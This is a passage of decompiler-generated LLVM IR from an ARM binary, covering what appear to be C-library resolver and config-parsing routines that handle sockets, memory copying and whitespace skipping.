  %v5_1d97c = or i32 %v4_1d970, %v4_1d97c
  store i32 %v5_1d97c, i32* @lr, align 4
  %v4_1d980 = mul nuw nsw i32 %v4_1d96c, 256
  %v5_1d980 = or i32 %v4_1d980, %v4_1d964
  store i32 %v5_1d980, i32* %r3.global-to-local, align 4
  store i32 %v2_1d914, i32* @r5, align 4
  store i32 %v4_1d954, i32* @ip, align 4
  %v1_1d994 = add i32 %v2_1d934, 10
  store i32 %v1_1d994, i32* %r1.global-to-local, align 4
  %v1_1d998 = add i32 %v2_1d930, 10
  store i32 %v1_1d998, i32* @r4, align 4
  %v2_1d99c = sub i32 %v2_1d914, %v5_1d974
  %v3_1d99c = icmp uge i32 %v2_1d914, %v5_1d974
  store i1 %v3_1d99c, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_1d99c
  %v6_1d99c = and i32 %v2_1d914, %tmp226
  %v7_1d99c = icmp slt i32 %v6_1d99c, 0
  %v8_1d99c = icmp slt i32 %v2_1d99c, 0
  store i32 %v2_1d928, i32* %stack_var_-144, align 4
  %v2_1d9bc = xor i1 %v8_1d99c, %v7_1d99c
  br i1 %v2_1d9bc, label %dec_label_pc_1d9cc, label %dec_label_pc_1d9c4

dec_label_pc_1d9c4:                               ; preds = %dec_label_pc_1d924
  %v0_1d9c0 = load i32, i32* @sb, align 4
  %v2_1d9c0 = add i32 %v0_1d9c0, %v5_1d974
  store i32 %v2_1d9c0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d9c4 = icmp slt i32 %v2_1d9c0, 0
  br i1 %v1_1d9c4, label %dec_label_pc_1d9cc, label %dec_label_pc_1d9e8

dec_label_pc_1d9cc:                               ; preds = %dec_label_pc_1d9c4, %dec_label_pc_1d924, %dec_label_pc_1d8e0, %dec_label_pc_1d9c4.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d9d0 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_1d9d0, label %dec_label_pc_1db38, label %dec_label_pc_1d9d8

dec_label_pc_1d9d8:                               ; preds = %dec_label_pc_1d9cc
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d9dc, label %dec_label_pc_1db38, label %dec_label_pc_1db10

dec_label_pc_1d9e8:                               ; preds = %dec_label_pc_1d9c4
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d9ec = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_1d9ec, label %dec_label_pc_1da90, label %dec_label_pc_1d9f4

dec_label_pc_1d9f4:                               ; preds = %dec_label_pc_1d9e8
  %v0_1d9f4 = load i32, i32* @fp, align 4
  %v1_1d9f4 = add i32 %v0_1d9f4, 28
  store i32 %v1_1d9f4, i32* %r3.global-to-local, align 4
  %v1_1d9f8 = inttoptr i32 %v1_1d9f4 to i32*
  %v2_1d9f8 = load i32, i32* %v1_1d9f8, align 4
  store i32 %v2_1d9f8, i32* @r3, align 4
  %v3_1d9f8 = add i32 %v0_1d9f4, 32
  %v4_1d9f8 = inttoptr i32 %v3_1d9f8 to i32*
  %v5_1d9f8 = load i32, i32* %v4_1d9f8, align 4
  store i32 %v5_1d9f8, i32* @ip, align 4
  %v6_1d9f8 = add i32 %v0_1d9f4, 36
  %v7_1d9f8 = inttoptr i32 %v6_1d9f8 to i32*
  %v8_1d9f8 = load i32, i32* %v7_1d9f8, align 4
  store i32 %v8_1d9f8, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1d9f4, i32* @r0, align 4
  store i32 %v2_1d8c8, i32* @r1, align 4
  %v0_1da14 = call i32 @memcpy()
  %v0_1da18 = load i32, i32* @fp, align 4
  %v1_1da18 = add i32 %v0_1da18, 4
  %v2_1da18 = inttoptr i32 %v1_1da18 to i32*
  %v3_1da18 = load i32, i32* %v2_1da18, align 4
  %v2_1da1c = icmp ugt i32 %v3_1da18, 23
  store i1 %v2_1da1c, i1* %cpsr_c.global-to-local, align 1
  %v7_1da1c = icmp eq i32 %v3_1da18, 24
  br i1 %v7_1da1c, label %dec_label_pc_1da40, label %dec_label_pc_1da24

dec_label_pc_1da24:                               ; preds = %dec_label_pc_1d9f4
  %v1_1da24 = add i32 %v0_1da18, 28
  %v2_1da24 = inttoptr i32 %v1_1da24 to i32*
  %v3_1da24 = load i32, i32* %v2_1da24, align 4
  store i32 %v3_1da24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1da28 = icmp eq i32 %v3_1da24, 0
  br i1 %v2_1da28, label %dec_label_pc_1db10, label %dec_label_pc_1da30

dec_label_pc_1da30:                               ; preds = %dec_label_pc_1da24
  store i1 %v2_1da34, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1da34, label %dec_label_pc_1da40, label %bb227

bb227:                                            ; preds = %dec_label_pc_1da30
  store i1 %v3_1da38, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1da38, label %dec_label_pc_1da40, label %dec_label_pc_1db10

dec_label_pc_1da40:                               ; preds = %dec_label_pc_1da30, %bb227, %dec_label_pc_1d9f4
  store i32 %v0_1d418, i32* %r1.global-to-local, align 4
  %v3_1da44 = icmp uge i32 %v3_1da18, %v0_1d418
  store i1 %v3_1da44, i1* %cpsr_c.global-to-local, align 1
  %v9_1da44 = icmp eq i32 %v3_1da18, %v0_1d418
  br i1 %v9_1da44, label %dec_label_pc_1da54, label %bb228

bb228:                                            ; preds = %dec_label_pc_1da40
  br label %dec_label_pc_1dae8

dec_label_pc_1da54:                               ; preds = %dec_label_pc_1da40
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_1da5c = add i32 %v0_1da18, 16
  %v2_1da5c = inttoptr i32 %v1_1da5c to i32*
  %v3_1da5c = load i32, i32* %v2_1da5c, align 4
  %v2_1da60 = sub i32 %tmp159, %stack_var_-452.061
  %v1_1da64 = add i32 %v2_1da60, -1
  store i32 %v1_1da64, i32* %r3.global-to-local, align 4
  %v1_1da68 = add i32 %v3_1da5c, 4
  %v2_1da6c = mul i32 %v1_1da68, %v1_1da64
  store i32 %v2_1da6c, i32* %r1.global-to-local, align 4
  %v1_1da70 = add i32 %v0_1da18, 32
  %v2_1da70 = inttoptr i32 %v1_1da70 to i32*
  %v3_1da70 = load i32, i32* %v2_1da70, align 4
  %v3_1da74 = icmp uge i32 %v2_1da6c, %v3_1da70
  store i1 %v3_1da74, i1* %cpsr_c.global-to-local, align 1
  %v2_1da78 = add i32 %v0_1da18, 36
  %v3_1da78 = inttoptr i32 %v2_1da78 to i32*
  store i32 %v1_1da64, i32* %v3_1da78, align 4
  %tmp286 = icmp ugt i32 %v2_1da6c, %v3_1da70
  br i1 %tmp286, label %dec_label_pc_1db10, label %dec_label_pc_1da80

dec_label_pc_1da80:                               ; preds = %dec_label_pc_1da54
  store i32 0, i32* @r7, align 4
  %v1_1da88 = load i32, i32* @fp, align 4
  %v2_1da88 = add i32 %v1_1da88, 36
  %v3_1da88 = inttoptr i32 %v2_1da88 to i32*
  store i32 0, i32* %v3_1da88, align 4
  br label %dec_label_pc_1dae8

dec_label_pc_1da90:                               ; preds = %dec_label_pc_1d9e8
  store i32 %v2_1d928, i32* @r0, align 4
  %v0_1da94 = call i32 @free()
  store i32 %v5_1d97c, i32* %r3.global-to-local, align 4
  store i32 %v0_1d418, i32* @ip, align 4
  %v3_1daa0 = icmp uge i32 %v5_1d97c, %v0_1d418
  store i1 %v3_1daa0, i1* %cpsr_c.global-to-local, align 1
  %v9_1daa0 = icmp eq i32 %v5_1d97c, %v0_1d418
  br i1 %v9_1daa0, label %dec_label_pc_1daa8, label %dec_label_pc_1dae8

dec_label_pc_1daa8:                               ; preds = %dec_label_pc_1da90
  %v0_1daa8 = load i32, i32* @fp, align 4
  %v1_1daa8 = add i32 %v0_1daa8, 16
  %v2_1daa8 = inttoptr i32 %v1_1daa8 to i32*
  %v3_1daa8 = load i32, i32* %v2_1daa8, align 4
  store i32 %v3_1daa8, i32* %r1.global-to-local, align 4
  store i32 %v5_1d974, i32* %r3.global-to-local, align 4
  %v3_1dab0 = icmp uge i32 %v3_1daa8, %v5_1d974
  store i1 %v3_1dab0, i1* %cpsr_c.global-to-local, align 1
  %v9_1dab0 = icmp eq i32 %v3_1daa8, %v5_1d974
  br i1 %v9_1dab0, label %dec_label_pc_1dac4, label %dec_label_pc_1dab8

dec_label_pc_1dab8:                               ; preds = %dec_label_pc_1daa8
  %v1_1dab8 = inttoptr i32 %v0_1daa8 to i32*
  %v2_1dab8 = load i32, i32* %v1_1dab8, align 4
  store i32 %v2_1dab8, i32* @r0, align 4
  %v0_1dabc = call i32 @free()
  br label %dec_label_pc_1db38

dec_label_pc_1dac4:                               ; preds = %dec_label_pc_1daa8
  %v1_1dac4 = add i32 %v0_1daa8, 36
  %v2_1dac4 = inttoptr i32 %v1_1dac4 to i32*
  %v3_1dac4 = load i32, i32* %v2_1dac4, align 4
  %v1_1dac8 = add i32 %v0_1daa8, 28
  %v2_1dac8 = inttoptr i32 %v1_1dac8 to i32*
  %v3_1dac8 = load i32, i32* %v2_1dac8, align 4
  store i32 %v3_1dac8, i32* @r3, align 4
  %v3_1dacc = mul i32 %v3_1dac4, %v5_1d974
  %v4_1dacc = add i32 %v3_1dac8, %v3_1dacc
  store i32 %v4_1dacc, i32* @r0, align 4
  store i32 %v5_1d974, i32* @r2, align 4
  store i32 %v1_1d994, i32* @r1, align 4
  %v0_1dad8 = call i32 @memcpy()
  %v0_1dadc = load i32, i32* @fp, align 4
  %v1_1dadc = add i32 %v0_1dadc, 36
  %v2_1dadc = inttoptr i32 %v1_1dadc to i32*
  %v3_1dadc = load i32, i32* %v2_1dadc, align 4
  %v1_1dae0 = add i32 %v3_1dadc, 1
  store i32 %v1_1dae0, i32* %r3.global-to-local, align 4
  store i32 %v1_1dae0, i32* %v2_1dadc, align 4
  br label %dec_label_pc_1dae8

dec_label_pc_1dae8:                               ; preds = %bb228, %dec_label_pc_1da90, %dec_label_pc_1da80, %dec_label_pc_1dac4
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1dac4 ], [ 0, %dec_label_pc_1da90 ], [ 0, %dec_label_pc_1da80 ], [ 1, %bb228 ]
  %v1_1daf0 = load i32, i32* @r4, align 4
  %v1_1daf4 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_1daf4, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1db08 = icmp uge i32 %v1_1daf4, %tmp159
  store i1 %v3_1db08, i1* %cpsr_c.global-to-local, align 1
  %v5_1db0c = icmp slt i32 %v1_1daf4, %tmp159
  br i1 %v5_1db0c, label %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge, label %dec_label_pc_1db10

dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge:  ; preds = %dec_label_pc_1dae8
  %v2_1daf0 = add i32 %v1_1daf0, %stack_var_-460.364
  %v0_1d8e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1d8e0

dec_label_pc_1db10:                               ; preds = %dec_label_pc_1d9d8, %dec_label_pc_1d8bc, %dec_label_pc_1dae8, %dec_label_pc_1da24, %dec_label_pc_1da54, %bb227
  %v1_1db14 = call i32 @__GI_close(i32 %v3_1d6e8)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1db1c = icmp eq i32 %arg3, 0
  br i1 %v2_1db1c, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1db10
  %v1_1db24 = load i32, i32* @sl, align 4
  %v3_1db20 = inttoptr i32 %arg3 to i32*
  store i32 %v1_1db24, i32* %v3_1db20, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1db10
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_1db2c.1242 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1db1c, i32 ptrtoint (i32* @global_var_17268.1116 to i32))
  store i32 %v1_1d460, i32* @r0, align 4
  %v0_1db30 = call i32 @free()
  br label %dec_label_pc_1dba0

dec_label_pc_1db38:                               ; preds = %thread-pre-split, %dec_label_pc_1d734, %dec_label_pc_1d894, %dec_label_pc_1d88c, %dec_label_pc_1d83c, %dec_label_pc_1d848, %dec_label_pc_1d854thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1d80c, %dec_label_pc_1d9d8, %dec_label_pc_1d9cc, %dec_label_pc_1d6f8, %dec_label_pc_1d6d8, %dec_label_pc_1dab8
  %v1_1db3c = add i32 %v0_1d5fc, 1
  store i32 %v1_1db3c, i32* @r5, align 4
  br label %dec_label_pc_1db48

dec_label_pc_1db48:                               ; preds = %.thread7, %dec_label_pc_1db38
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1db38 ], [ %v7_1d7f8, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_1db3c, %dec_label_pc_1db38 ], [ %v0_1d5fc, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_1db4c = add i32 %stack_var_-476.1, -1
  store i32 %v1_1db4c, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_1db4c, 1
  br i1 %tmp232, label %dec_label_pc_1db68, label %dec_label_pc_1d500

dec_label_pc_1db60:                               ; preds = %dec_label_pc_1d6ac, %bb218, %bb213, %.thread5, %dec_label_pc_1d47c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1db68

dec_label_pc_1db68:                               ; preds = %dec_label_pc_1db48, %.thread132, %dec_label_pc_1db60
  %stack_var_-472.1 = phi i32 [ %v1_1d460, %dec_label_pc_1db60 ], [ 0, %.thread132 ], [ %v1_1d460, %dec_label_pc_1db48 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1db60 ], [ -1, %.thread132 ], [ %v3_1d6e8, %dec_label_pc_1db48 ]
  %v0_1db68 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1db74 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1db74, i1* %cpsr_c.global-to-local, align 1
  %v7_1db74 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1db78 = inttoptr i32 %v0_1db68 to i32*
  store i32 -1, i32* %v2_1db78, align 4
  br i1 %v7_1db74, label %dec_label_pc_1db88, label %dec_label_pc_1db80

dec_label_pc_1db80:                               ; preds = %dec_label_pc_1db68, %dec_label_pc_1d834
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1db68 ], [ %v1_1d460, %dec_label_pc_1d834 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1db68 ], [ %v3_1d6e8, %dec_label_pc_1d834 ]
  %v1_1db84 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1db88

dec_label_pc_1db88:                               ; preds = %dec_label_pc_1db68, %dec_label_pc_1db80
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1db68 ], [ %stack_var_-472.2, %dec_label_pc_1db80 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1db8c = call i32 @free()
  %v0_1db90 = load i32, i32* @sl, align 4
  store i32 %v0_1db90, i32* @r0, align 4
  %v0_1db94 = call i32 @free()
  br label %dec_label_pc_1dba0

dec_label_pc_1dba0:                               ; preds = %bb231, %dec_label_pc_1db88
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1db88 ], [ %v5_1d770, %bb231 ]
  store i32 %v3_1d404, i32* @r4, align 4
  store i32 %v6_1d404, i32* @r5, align 4
  store i32 %v9_1d404, i32* @r6, align 4
  store i32 %v12_1d404, i32* @r7, align 4
  store i32 %v15_1d404, i32* @r8, align 4
  store i32 %v18_1d404, i32* @sb, align 4
  store i32 %v21_1d404, i32* @sl, align 4
  store i32 %v24_1d404, i32* @fp, align 4
  store i32 %v27_1d404, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1db4c, { 1, 2, 0 }
  uselistorder i32 %v1_1daf4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1daa8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1da64, { 1, 0, 2 }
  uselistorder i32 %v2_1d99c, { 1, 0 }
  uselistorder i32 %v5_1d974, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1d934, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1d930, { 1, 0 }
  uselistorder i32 %v2_1d914, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1d910, { 1, 0 }
  uselistorder i32 %v1_1d90c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1d88c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1d868, { 1, 0 }
  uselistorder i32 %v3_1d85c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1d85c, { 0, 2, 1 }
  uselistorder i32 %v2_1d84c, { 0, 2, 1 }
  uselistorder i1 %v7_1d780, { 1, 0 }
  uselistorder i32 %v1_1d780, { 1, 0 }
  uselistorder i32 %v0_1d780, { 1, 0 }
  uselistorder i32 %v5_1d770, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1d6e8, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1d6a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1d62c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1d614, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1d608, { 1, 0 }
  uselistorder i32 %v0_1d5fc, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_1d5b4, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_1d504, { 1, 0 }
  uselistorder i32 %v1_1d508, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1d8c4, { 1, 0, 2 }
  uselistorder i32 %v1_1d7d4, { 2, 0, 1 }
  uselistorder i32 %v2_1d65c, { 1, 0, 2 }
  uselistorder i32 %v2_1d634, { 1, 0 }
  uselistorder i32 %v0_1d47c, { 1, 0, 2 }
  uselistorder i32 %v1_1d460, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_1d42c, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1d418, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 53, 18, 19, 52, 54, 20, 21, 22, 23, 24, 25, 26, 49, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 28, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 55, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32)* @__GI_close, { 14, 13, 15, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 12, 18, 17, 16, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 64, { 1, 15, 0, 12, 16, 10, 4, 5, 6, 7, 13, 14, 2, 3, 11, 17, 8, 18, 9 }
  uselistorder i32 1000, { 3, 2, 4, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 7, 6, 5, 0, 4, 3, 8, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 2, 11, 10, 9, 8, 1, 0, 7, 6, 5, 4, 3, 12 }
  uselistorder i32 17, { 1, 17, 2, 11, 3, 12, 4, 13, 5, 14, 0, 16, 18, 6, 7, 9, 8, 10, 15 }
  uselistorder i32 80, { 0, 4, 15, 16, 17, 5, 1, 6, 7, 8, 10, 9, 19, 11, 12, 13, 3, 14, 20, 21, 22, 2, 18 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26316, { 2, 0, 1, 3 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 512, { 4, 6, 3, 7, 2, 8, 9, 10, 11, 5, 0, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1dba0, { 1, 0 }
  uselistorder label %dec_label_pc_1db88, { 1, 0 }
  uselistorder label %dec_label_pc_1db68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1db60, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1db48, { 1, 0 }
  uselistorder label %dec_label_pc_1db38, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1db10, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1dae8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1da40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d9cc, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1d8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1d88c, { 1, 0 }
  uselistorder label %dec_label_pc_1d85c, { 1, 0 }
  uselistorder label %dec_label_pc_1d834, { 1, 0 }
  uselistorder label %dec_label_pc_1d780, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1d5dc, { 1, 0 }
  uselistorder label %dec_label_pc_1d5a0, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1dbb0:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1dbb0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1dbb0, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_1dbb0
  %v2_1dbb8 = load i32, i32* @r8, align 4
  %v2_1dbbc = load i32, i32* @ip, align 4
  %v9_1dbcc = sub i32 0, %v2_1dbb8
  %v3_1dbd0 = udiv i32 %v2_1dbb8, 256
  %v4_1dbd0 = mul i32 %v2_1dbb8, 16777216
  %v5_1dbd0 = or i32 %v3_1dbd0, %v4_1dbd0
  %v8_1dbd0 = and i32 %v5_1dbd0, %v9_1dbcc
  %v2_1dbd8 = load i32, i32* @fp, align 4
  %v3_1dbd8 = udiv i32 %v2_1dbd8, 256
  %v4_1dbd8 = mul i32 %v2_1dbd8, 16777216
  %v5_1dbd8 = or i32 %v3_1dbd8, %v4_1dbd8
  %v8_1dbd8 = and i32 %v8_1dbd0, %v5_1dbd8
  %v9_1dbe0 = sub i32 %v8_1dbd8, %v2_1dbbc
  %v8_1dbe4 = shl i32 %v2_1dbbc, %v9_1dbe0
  %v9_1dbe4 = and i32 %v8_1dbe4, %v9_1dbe0
  %v2_1dbe8 = load i32, i32* @sl, align 4
  %v3_1dbe8 = udiv i32 %v2_1dbe8, 256
  %v4_1dbe8 = mul i32 %v2_1dbe8, 16777216
  %v5_1dbe8 = or i32 %v3_1dbe8, %v4_1dbe8
  %v8_1dbe8 = and i32 %v9_1dbe4, %v5_1dbe8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1dbb0, %bb
  %v9_1dbe8 = phi i32 [ %tmp, %dec_label_pc_1dbb0 ], [ %v8_1dbe8, %bb ]
  ret i32 %v9_1dbe8

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 532, i32* @lr, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1dc44 = load i32, i32* @r4, align 4
  store i32 %v3_1dc44, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @ip, align 4
  store i32 532, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1dc54.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1dc549 = inttoptr i32 %v0_1dc54.pre to i8*
  %v2_1dc5410 = load i8, i8* %v1_1dc549, align 1
  %v2_1dc5812 = icmp eq i8 %v2_1dc5410, 0
  store i1 %v2_1dc5812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc5812, label %dec_label_pc_1dc88, label %dec_label_pc_1dc64

dec_label_pc_1dc64:                               ; preds = %entry, %bb8.dec_label_pc_1dc64_crit_edge
  %v1_1dc64 = phi i32 [ %v1_1dc64.pre, %bb8.dec_label_pc_1dc64_crit_edge ], [ 532, %entry ]
  %v0_1dc64 = phi i32 [ %v0_1dc64.pre, %bb8.dec_label_pc_1dc64_crit_edge ], [ ptrtoint (i16* @global_var_2c158.876 to i32), %entry ]
  %v2_1dc5416 = phi i8 [ %v2_1dc54, %bb8.dec_label_pc_1dc64_crit_edge ], [ %v2_1dc5410, %entry ]
  %v2_1dc5c17.in.in = phi i8 [ %v2_1dc54, %bb8.dec_label_pc_1dc64_crit_edge ], [ %v2_1dc5410, %entry ]
  %v1_1dc5415 = phi i8* [ %v1_1dc54, %bb8.dec_label_pc_1dc64_crit_edge ], [ %v1_1dc549, %entry ]
  %v2_1dc7c14 = phi i32 [ %v2_1dc80, %bb8.dec_label_pc_1dc64_crit_edge ], [ %v0_1dc54.pre, %entry ]
  %v2_1dc5c17.in = zext i8 %v2_1dc5c17.in.in to i32
  %v2_1dc5c17 = mul nuw nsw i32 %v2_1dc5c17.in, 2
  %v2_1dc64 = add i32 %v1_1dc64, %v0_1dc64
  %v3_1dc64 = inttoptr i32 %v2_1dc64 to i32*
  %v4_1dc64 = load i32, i32* %v3_1dc64, align 4
  %v2_1dc68 = add i32 %v4_1dc64, %v2_1dc5c17
  %v3_1dc68 = inttoptr i32 %v2_1dc68 to i16*
  %v4_1dc68 = load i16, i16* %v3_1dc68, align 2
  %v1_1dc6c = and i16 %v4_1dc68, 32
  %v2_1dc6c = icmp eq i16 %v1_1dc6c, 0
  store i1 %v2_1dc6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1dc6c, label %dec_label_pc_1dc88, label %dec_label_pc_1dc74

dec_label_pc_1dc74:                               ; preds = %dec_label_pc_1dc64
  %v7_1dc74 = icmp eq i8 %v2_1dc5416, 35
  br i1 %v7_1dc74, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1dc74
  %v8_1dc78 = icmp eq i8 %v2_1dc5416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1dc74, %bb
  %storemerge = phi i1 [ %v8_1dc78, %bb ], [ %v7_1dc74, %dec_label_pc_1dc74 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1dc7c = load i32, i32* %lr.global-to-local, align 4
  %v1_1dc7c = trunc i32 %v0_1dc7c to i8
  store i8 %v1_1dc7c, i8* %v1_1dc5415, align 1
  %v0_1dc80 = load i1, i1* %cpsr_z.global-to-local, align 1
